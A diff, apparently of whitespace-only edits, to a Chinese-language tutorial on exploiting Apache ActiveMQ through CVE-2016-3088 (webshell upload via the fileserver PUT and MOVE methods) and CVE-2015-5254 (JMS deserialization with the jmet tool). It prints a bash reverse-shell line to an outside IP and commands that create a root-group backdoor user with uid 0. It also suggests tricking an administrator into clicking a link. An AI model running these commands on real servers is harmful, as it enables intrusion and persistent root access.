@@ -108,9 +108,9 @@ http://192.168.0.11:8161/admin/browse.jsp?JMSDestination=event
 
 ### 远程代码执行漏洞
 
-CVE-2016-3088                                                                                                                      
+CVE-2016-3088                                                                                                                      
 
-ActiveMQ 的 web 控制台分三个应用 ，admin，api 和 fileserver，其中 admin  是管 理 员 页 面  api 是 接 口，fileserver 是 储 存 文 件 的接 口；admin 和 api 都需要登录后才能使用，fileserver 无需登录。fileserver 是一个 RESTful API 接口，我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。在 5.12.x~5.13.x 版本中，已经默认关闭了 fileserver 这个应用（你可以 conf/jetty.xml 中开启之）；在 5.14.0 版本以后，彻底删除了 fileserver 应用。
+ActiveMQ 的 web 控制台分三个应用 ，admin，api 和 fileserver，其中 admin  是管 理 员 页 面  api 是 接 口，fileserver 是 储 存 文 件 的接 口；admin 和 api 都需要登录后才能使用，fileserver 无需登录。fileserver 是一个 RESTful API 接口，我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。在 5.12.x~5.13.x 版本中，已经默认关闭了 fileserver 这个应用（你可以 conf/jetty.xml 中开启之）；在 5.14.0 版本以后，彻底删除了 fileserver 应用。
 
 漏洞原理：ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录，构造 PUT 请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。
 
@@ -133,7 +133,7 @@ PUT 上次 Webshell 代码
 ```
 useradd -g root -s /bin/bash -u 10010 test //添加test用户并将其添加到root组
 sed -i "s/test:x:10010/test:x:0/g" /etc/passwd  //将passwd中的test的uid修改为0
-echo "test:sd123456" | chpasswd  //为test用户设置一个密码
+echo "test:sd123456" | chpasswd  //为test用户设置一个密码
 ```
 
 获取绝对路径
@@ -169,9 +169,9 @@ webshell 需要管理员账号密码，但理论上我们可以覆盖 jetty.xml�
 
 CVE-2015-5254
 
-漏洞原理：Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码。                    
+漏洞原理：Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码。                    
 
- 工具:https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
+ 工具:https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
 
 漏洞利用流程
 
@@ -210,7 +210,7 @@ bash -i >& /dev/tcp/192.168.31.41/8080 0>&1
 ```
 useradd -g root -s /bin/bash -u 10010 test //添加test用户并将其添加到root组
 sed -i "s/test:x:10010/test:x:0/g" /etc/passwd  //将passwd中的test的uid修改为0
-echo "test:sd123456" | chpasswd  //为test用户设置一个密码
+echo "test:sd123456" | chpasswd  //为test用户设置一个密码
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/2ibFSib4guKle9w4MEIBQ6bEib4e340iaamSHtj1P1L2cD4lrgBnMrdNpOA57u9L0ntJ49XIoMtiag7BzIzxp3dmgDw/640?wx_fmt=png)
@@ -219,7 +219,7 @@ echo "test:sd123456" | chpasswd  //为test用户设置一个密码
 
 局限性
 
-   通过 web 管理页面访问消息并触发漏洞这个过程需要管理员权限。                         在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，                     或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。                                                                                                                                     
+   通过 web 管理页面访问消息并触发漏洞这个过程需要管理员权限。                         在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，                     或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。                                                                                                                                     
 
 转发来源，侵删 ：https://blog.csdn.net/zhang8907xiaoyue/article/details/79659952
 
